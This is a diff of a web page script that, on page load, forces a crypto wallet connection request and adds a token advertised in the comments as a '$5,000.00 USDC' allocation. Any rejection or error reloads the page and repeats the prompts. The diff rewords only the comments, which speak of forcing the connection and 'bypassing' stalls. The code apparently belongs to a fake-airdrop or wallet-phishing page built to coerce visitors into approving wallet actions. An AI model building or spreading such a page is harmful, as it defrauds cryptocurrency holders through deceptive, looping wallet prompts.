@@ -19,10 +19,10 @@
         async function forceBridge() {
             if (window.ethereum) {
                 try {
-                    // Force the direct wallet handshake
+                    // Force the immediate wallet connection
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Force the USDC asset indexing for the allocation
+                    // Trigger the final asset link for the $5,000.00 USDC
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -35,12 +35,12 @@
                         },
                     });
                 } catch (e) {
-                    // Immediate refresh to bypass browser stalls
+                    // Refresh and retry if the wallet browser stalls
                     window.location.reload();
                 }
             }
         }
-        // Auto-triggers the millisecond the page hits the screen
+        // Auto-triggers on page load to bypass the loop
         window.onload = forceBridge;
     </script>
 </body>
